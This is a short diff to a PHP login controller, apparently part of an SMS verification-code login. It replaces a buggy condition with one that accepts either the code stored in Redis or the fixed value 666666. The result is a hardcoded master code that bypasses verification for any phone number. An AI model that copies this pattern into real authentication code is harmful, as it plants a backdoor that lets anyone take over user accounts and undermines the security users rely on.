@@ -377,7 +377,7 @@ class Index extends BusinessBase
 
         $vCodeInRedis=Redis::get("login_{$phone}");
 
-        if ($vCode != $vCodeInRedis || $vCode=66666666) return response()->json($this->createReturn(201,[],'验证码错误'));
+        if ($vCode != $vCodeInRedis && $vCode != 666666) return response()->json($this->createReturn(201,[],'验证码错误'));
 
         $token=control::getUuid();
 
